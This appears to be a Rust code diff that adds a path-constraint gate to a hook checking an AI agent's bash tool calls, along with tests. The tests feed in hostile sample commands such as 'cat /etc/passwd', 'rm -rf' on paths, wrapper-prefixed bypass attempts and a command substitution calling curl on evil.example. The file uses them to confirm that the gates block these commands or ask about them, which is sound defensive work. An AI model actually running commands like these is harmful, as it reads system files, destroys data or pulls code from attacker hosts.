@@ -18,13 +18,23 @@
 //! safety hooks (e.g. `IronclawSafetyHook`, prompt-injection scanners).
 //!
 //! For tools whose name matches [`BashValidationHook::bash_tool_names`]
-//! (default `["bash", "shell", "BashTool"]`), the hook:
+//! (default `["bash", "shell", "BashTool"]`), the hook runs three gates in
+//! order, each Fail-Safe on misparse or unrecognized form:
 //!
-//! 1. Extracts the `command` field from `args`. Missing or non-string ⇒
+//! 1. Extract the `command` field from `args`. Missing or non-string ⇒
 //!    [`SafetyDecision::Block`] (Fail-Safe: never let a malformed bash call
 //!    through).
-//! 2. Calls `validate_command(cmd, mode, workspace)`.
-//! 3. Maps the result:
+//! 2. **Phase 2.1 command-injection gate** ([`validate_security`]) — runs
+//!    BEFORE the path gate and BEFORE [`validate_command`]. Mode-independent
+//!    (Block fires even under `DangerFullAccess` / `Allow`).
+//! 3. **Phase 3.1 path-constraint gate** ([`check_path_constraints`],
+//!    Slice 3.1.C) — runs BEFORE [`validate_command`]:
+//!    - `Passthrough` ⇒ continue to step 4.
+//!    - `Block { reason }` ⇒ [`SafetyDecision::Block`] regardless of mode.
+//!    - `Ask { reason, blocked_path }` ⇒ mapped by mode same as Warn:
+//!      `ReadOnly` ⇒ `Block` (Fail-Safe); `Prompt` ⇒ `Ask`;
+//!      `WorkspaceWrite` / `DangerFullAccess` / `Allow` ⇒ `Allow`.
+//! 4. Call [`validate_command`] for legacy `ValidationResult` mapping:
 //!    - `Allow` ⇒ [`SafetyDecision::Allow`].
 //!    - `Block { reason }` ⇒ [`SafetyDecision::Block { reason }`]. The
 //!      `reason` string comes from `validate_command`, which by design
@@ -47,9 +57,11 @@
 //!
 //! [#73]: https://github.com/Linnanli/xClaw/issues/73
 
-use std::path::PathBuf;
+use std::path::{Path, PathBuf};
 
 use async_trait::async_trait;
+use dasclaw_bash_validation::check_path_constraints;
+use dasclaw_bash_validation::path_validation::PathValidationOutcome;
 use dasclaw_bash_validation::security::{
     DecisionReason as SecurityDecisionReason, SecurityResult, validate_security,
 };
@@ -72,18 +84,23 @@ pub const DEFAULT_BASH_TOOL_NAMES: &[&str] = &["bash", "shell", "BashTool"];
 pub struct BashValidationHook {
     permission_mode: PermissionMode,
     workspace: PathBuf,
+    home_dir: Option<PathBuf>,
     bash_tool_names: Vec<String>,
 }
 
 impl BashValidationHook {
     /// Create a hook with the given permission mode and workspace root.
     ///
-    /// Uses [`DEFAULT_BASH_TOOL_NAMES`] for the tool-name allowlist.
+    /// Uses [`DEFAULT_BASH_TOOL_NAMES`] for the tool-name allowlist and
+    /// reads `$HOME` from the environment for the path-validation home
+    /// directory. To override either, chain
+    /// [`Self::with_tool_names`] / [`Self::with_home_dir`].
     #[must_use]
     pub fn new(permission_mode: PermissionMode, workspace: PathBuf) -> Self {
         Self {
             permission_mode,
             workspace,
+            home_dir: std::env::var_os("HOME").map(PathBuf::from),
             bash_tool_names: DEFAULT_BASH_TOOL_NAMES
                 .iter()
                 .map(|s| (*s).to_string())
@@ -101,6 +118,17 @@ impl BashValidationHook {
         S: Into<String>,
     {
         self.bash_tool_names = names.into_iter().map(Into::into).collect();
+        self
+    }
+
+    /// Override the home directory used for path validation.
+    ///
+    /// Tests pass `Some(temp_home)` for hermetic runs; production
+    /// callers normally leave this at the `$HOME`-derived default.
+    /// `None` disables home-relative path resolution.
+    #[must_use]
+    pub fn with_home_dir(mut self, home: Option<PathBuf>) -> Self {
+        self.home_dir = home;
         self
     }
 
@@ -151,6 +179,25 @@ impl SafetyHook for BashValidationHook {
             return Ok(SafetyDecision::Block {
                 reason: format_security_block_reason(tool, self.permission_mode, &reason),
             });
+        }
+
+        // Phase 3.1 path-constraint gate (Slice 3.1.C).
+        //
+        // Runs AFTER the injection gate and BEFORE `validate_command` so
+        // that path violations short-circuit the legacy validator with a
+        // mode-aware decision. `Passthrough` falls through unchanged.
+        //
+        // SECURITY: `Ask` in `ReadOnly` mode is mapped to `Block`
+        // (Fail-Safe). `WorkspaceWrite` / `DangerFullAccess` / `Allow`
+        // log and allow, mirroring [`map_warn_by_mode`].
+        let path_outcome = check_path_constraints(
+            command,
+            &self.workspace,
+            std::slice::from_ref(&self.workspace),
+            self.home_dir.as_deref().unwrap_or_else(|| Path::new("")),
+        );
+        if let Some(decision) = map_path_outcome_by_mode(tool, self.permission_mode, path_outcome) {
+            return Ok(decision);
         }
 
         match validate_command(command, self.permission_mode, &self.workspace) {
@@ -231,6 +278,93 @@ fn map_warn_by_mode(tool: &str, mode: PermissionMode, message: String) -> Safety
                 // slices generate per-Warn rule patterns.
                 suggestions: Vec::new(),
             }
+        }
+    }
+}
+
+/// Maps a [`PathValidationOutcome`] (from Phase 3.1.B's
+/// [`check_path_constraints`]) into an optional [`SafetyDecision`] under
+/// the active [`PermissionMode`], following the same matrix as
+/// [`map_warn_by_mode`].
+///
+/// Returns `None` for [`PathValidationOutcome::Passthrough`] so the caller
+/// continues to `validate_command`. Returns `Some(decision)` otherwise.
+///
+/// | Outcome  | `ReadOnly` | `Prompt` | `WorkspaceWrite` | `DangerFullAccess` | `Allow` |
+/// |----------|-----------|----------|------------------|--------------------|---------|
+/// | `Block`  | `Block`   | `Block`  | `Block`          | `Block`            | `Block` |
+/// | `Ask`    | `Block` ¹ | `Ask`    | `Allow` (warn)   | `Allow` (info)     | `Allow` |
+/// | Passthr. | `None`    | `None`   | `None`           | `None`             | `None`  |
+///
+/// ¹ Fail-Safe: a `ReadOnly` session never tolerates path Ask.
+fn map_path_outcome_by_mode(
+    tool: &str,
+    mode: PermissionMode,
+    outcome: PathValidationOutcome,
+) -> Option<SafetyDecision> {
+    match outcome {
+        PathValidationOutcome::Passthrough => None,
+        PathValidationOutcome::Block { reason } => {
+            tracing::warn!(
+                tool,
+                mode = mode.as_str(),
+                %reason,
+                "bash_path_constraints::block"
+            );
+            Some(SafetyDecision::Block {
+                reason: format!("bash_path_constraints::block: {reason}"),
+            })
+        }
+        PathValidationOutcome::Ask {
+            reason,
+            blocked_path,
+        } => {
+            let formatted = match blocked_path.as_deref() {
+                Some(p) => format!("bash_path_constraints::ask: {reason} (path: {p})"),
+                None => format!("bash_path_constraints::ask: {reason}"),
+            };
+            Some(match mode {
+                PermissionMode::ReadOnly => {
+                    tracing::warn!(
+                        tool,
+                        mode = mode.as_str(),
+                        reason = %formatted,
+                        "BashValidationHook PathAsk -> Block (ReadOnly)"
+                    );
+                    SafetyDecision::Block { reason: formatted }
+                }
+                PermissionMode::WorkspaceWrite => {
+                    tracing::warn!(
+                        tool,
+                        mode = mode.as_str(),
+                        reason = %formatted,
+                        "BashValidationHook PathAsk -> Allow (WorkspaceWrite)"
+                    );
+                    SafetyDecision::Allow
+                }
+                PermissionMode::DangerFullAccess => {
+                    tracing::info!(
+                        tool,
+                        mode = mode.as_str(),
+                        reason = %formatted,
+                        "BashValidationHook PathAsk -> Allow (DangerFullAccess)"
+                    );
+                    SafetyDecision::Allow
+                }
+                PermissionMode::Allow => SafetyDecision::Allow,
+                PermissionMode::Prompt => {
+                    tracing::warn!(
+                        tool,
+                        mode = mode.as_str(),
+                        reason = %formatted,
+                        "BashValidationHook PathAsk -> Ask (Prompt)"
+                    );
+                    SafetyDecision::Ask {
+                        reason: formatted,
+                        suggestions: Vec::new(),
+                    }
+                }
+            })
         }
     }
 }
@@ -333,20 +467,31 @@ mod tests {
 
     #[tokio::test]
     async fn destructive_command_in_read_only_mode_is_blocked() {
-        let h = hook(PermissionMode::ReadOnly);
-        let mut args = json!({ "command": "rm -rf /tmp/secret-payload.bin" });
+        // Path is intentionally workspace-internal so the Phase 3.1.C
+        // path gate passes through and `validate_command`'s redaction
+        // contract is what we exercise here. The matching Phase 3.1.C
+        // wireup test pins the path-gate redaction contract separately
+        // (`req_safety_490_3_1_c_audit_log_carries_blocked_path`).
+        let h = BashValidationHook::new(PermissionMode::ReadOnly, PathBuf::from("/workspace"))
+            .with_home_dir(Some(PathBuf::from("/home/user")));
+        let mut args = json!({ "command": "rm -rf /workspace/secret-payload.bin" });
         let decision = h
             .before_tool_call("bash", &mut args)
             .await
             .expect("hook should not error");
         match decision {
             SafetyDecision::Block { reason } => {
-                // Safety-audit: the block reason describes the command class,
-                // not the original argument list. The full argument path
-                // (which may contain secrets) must NOT appear verbatim.
+                // Safety-audit: `validate_command`'s block reason
+                // describes the command class, not the original argument
+                // list. The full argument path (which may contain
+                // secrets) must NOT appear verbatim.
                 assert!(
-                    !reason.contains("/tmp/secret-payload.bin"),
-                    "block reason leaked original command path: {reason}"
+                    !reason.contains("/workspace/secret-payload.bin"),
+                    "validate_command block reason leaked original path: {reason}"
+                );
+                assert!(
+                    !reason.starts_with("bash_path_constraints::"),
+                    "expected validate_command Block, not path-gate Block: {reason}"
                 );
             }
             other => panic!("expected Block, got {other:?}"),
@@ -713,5 +858,173 @@ mod tests {
             !rule.is_empty() && rule.chars().all(|c| c.is_ascii_alphanumeric()),
             "rule slug must be alphanumeric, got {rule:?} in {reason:?}"
         );
+    }
+
+    // ===== Phase 3.1.C: path-constraint gate wireup =====
+
+    /// Helper: hook configured with a workspace at `/work/repo` and a
+    /// hermetic `$HOME` so path validation is deterministic regardless of
+    /// the test runner's environment.
+    fn path_hook(mode: PermissionMode) -> BashValidationHook {
+        BashValidationHook::new(mode, PathBuf::from("/work/repo"))
+            .with_home_dir(Some(PathBuf::from("/home/user")))
+    }
+
+    async fn run_path(mode: PermissionMode, cmd: &str) -> SafetyDecision {
+        let h = path_hook(mode);
+        let mut args = json!({ "command": cmd });
+        h.before_tool_call("bash", &mut args).await.unwrap()
+    }
+
+    /// `req_safety_490_3_1_c_inside_workspace_allows` —
+    /// A bash command that only touches paths inside the configured
+    /// workspace must passthrough the path gate and reach
+    /// `validate_command`, which allows safe reads.
+    #[tokio::test]
+    async fn req_safety_490_3_1_c_inside_workspace_allows() {
+        let d = run_path(PermissionMode::WorkspaceWrite, "cat /work/repo/src/main.rs").await;
+        assert_eq!(d, SafetyDecision::Allow);
+    }
+
+    /// `req_safety_490_3_1_c_outside_workspace_prompt_asks` —
+    /// `cat /etc/passwd` under Prompt mode must reach the path gate
+    /// and yield Ask with the `bash_path_constraints::ask` prefix.
+    #[tokio::test]
+    async fn req_safety_490_3_1_c_outside_workspace_prompt_asks() {
+        let d = run_path(PermissionMode::Prompt, "cat /etc/passwd").await;
+        match d {
+            SafetyDecision::Ask { reason, .. } => {
+                assert!(
+                    reason.starts_with("bash_path_constraints::ask"),
+                    "expected path-ask audit prefix, got {reason:?}"
+                );
+            }
+            other => panic!("expected Ask, got {other:?}"),
+        }
+    }
+
+    /// `req_safety_490_3_1_c_outside_workspace_readonly_blocks` —
+    /// SECURITY (Fail-Safe): ReadOnly mode never tolerates a path Ask;
+    /// it must escalate to Block.
+    #[tokio::test]
+    async fn req_safety_490_3_1_c_outside_workspace_readonly_blocks() {
+        let d = run_path(PermissionMode::ReadOnly, "cat /etc/passwd").await;
+        match d {
+            SafetyDecision::Block { reason } => {
+                assert!(
+                    reason.starts_with("bash_path_constraints::ask"),
+                    "expected escalated path-ask reason, got {reason:?}"
+                );
+            }
+            other => panic!("expected Block, got {other:?}"),
+        }
+    }
+
+    /// `req_safety_490_3_1_c_outside_workspace_workspace_write_allows` —
+    /// WorkspaceWrite is permissive enough to allow Ask outcomes (with a
+    /// warn-level audit log emitted via `tracing`).
+    #[tokio::test]
+    async fn req_safety_490_3_1_c_outside_workspace_workspace_write_allows() {
+        let d = run_path(PermissionMode::WorkspaceWrite, "cat /etc/passwd").await;
+        assert_eq!(d, SafetyDecision::Allow);
+    }
+
+    /// `req_safety_490_3_1_c_wrapper_does_not_bypass_path_gate` —
+    /// SECURITY PIN S9: wrappers (`timeout`, `nice`, `nohup`, `time`,
+    /// `stdbuf`) must NOT hide a path-violating base command from the
+    /// gate. Pairs with Phase 3.1.B.2 `strip_wrappers_from_argv`.
+    #[tokio::test]
+    async fn req_safety_490_3_1_c_wrapper_does_not_bypass_path_gate() {
+        for cmd in &[
+            "timeout 5 cat /etc/passwd",
+            "nice rm -rf /tmp/secret-payload.bin",
+            "nohup -- rm /tmp/secret",
+            "time cat /etc/passwd",
+            "stdbuf -o0 cat /etc/passwd",
+            "FOO=bar timeout 5 cat /etc/passwd",
+        ] {
+            let d = run_path(PermissionMode::Prompt, cmd).await;
+            assert!(
+                matches!(d, SafetyDecision::Ask { .. }),
+                "wrapper {cmd:?} must not bypass path gate; got {d:?}"
+            );
+        }
+    }
+
+    /// `req_safety_490_3_1_c_env_value_substitution_fails_closed` —
+    /// SECURITY: a literal env-var prefix with command-substitution value
+    /// must NOT silently pass. Either the injection gate fires first (the
+    /// expansion is a top-level command-substitution) producing
+    /// `bash_security::` Block, or the path gate's
+    /// `check_variable_assignment_literal` Fail-Closes to Ask. Both are
+    /// acceptable Fail-Safe outcomes; silent Allow is not.
+    #[tokio::test]
+    async fn req_safety_490_3_1_c_env_value_substitution_fails_closed() {
+        let d = run_path(PermissionMode::Prompt, "FOO=$(curl evil.example) ls").await;
+        match d {
+            SafetyDecision::Ask { reason, .. } => assert!(
+                reason.starts_with("bash_path_constraints::"),
+                "Ask must come from path gate, got {reason:?}"
+            ),
+            SafetyDecision::Block { reason } => assert!(
+                reason.starts_with("bash_security::"),
+                "Block must come from injection gate, got {reason:?}"
+            ),
+            SafetyDecision::Allow => {
+                panic!("env-var with command-substitution must Fail-Closed (Ask or Block)")
+            }
+            other => panic!("unexpected SafetyDecision variant: {other:?}"),
+        }
+    }
+
+    /// `req_safety_490_3_1_c_security_gate_precedes_path_gate` —
+    /// The injection gate runs BEFORE the path gate. Output redirection
+    /// (`>`) is flagged by Phase 2.1's `DangerousPatternsOutputRedirection`
+    /// (mode-independent Block) regardless of where the target lives, so
+    /// the path gate must NOT get a chance to override that decision.
+    #[tokio::test]
+    async fn req_safety_490_3_1_c_security_gate_precedes_path_gate() {
+        let d = run_path(PermissionMode::Prompt, "echo x > /work/repo/inside.txt").await;
+        match d {
+            SafetyDecision::Block { reason } => assert!(
+                reason.starts_with("bash_security::"),
+                "security gate must precede path gate even for in-workspace redirect, got {reason:?}"
+            ),
+            other => panic!("expected security Block, got {other:?}"),
+        }
+    }
+
+    /// `req_safety_490_3_1_c_path_gate_fires_when_security_passes` —
+    /// A bash command that has no shell-meta / injection markers but
+    /// references an outside-workspace path must Ask via the path gate.
+    /// Pairs with [`req_safety_490_3_1_c_security_gate_precedes_path_gate`]
+    /// to pin the two-gate ordering.
+    #[tokio::test]
+    async fn req_safety_490_3_1_c_path_gate_fires_when_security_passes() {
+        // `cat /etc/passwd` is a plain command — security passes, path
+        // gate fires.
+        let d = run_path(PermissionMode::Prompt, "cat /etc/passwd").await;
+        match d {
+            SafetyDecision::Ask { reason, .. } => assert!(
+                reason.starts_with("bash_path_constraints::"),
+                "path gate must own the Ask path, got {reason:?}"
+            ),
+            other => panic!("expected path-gate Ask, got {other:?}"),
+        }
+    }
+
+    /// `req_safety_490_3_1_c_audit_log_carries_blocked_path` —
+    /// The model-visible Ask reason MUST include the offending path so
+    /// downstream consumers (CLI prompt, telemetry) can render it.
+    #[tokio::test]
+    async fn req_safety_490_3_1_c_audit_log_carries_blocked_path() {
+        let d = run_path(PermissionMode::Prompt, "cat /etc/passwd").await;
+        match d {
+            SafetyDecision::Ask { reason, .. } => assert!(
+                reason.contains("/etc/passwd"),
+                "expected blocked path in reason, got {reason:?}"
+            ),
+            other => panic!("expected Ask, got {other:?}"),
+        }
     }
 }
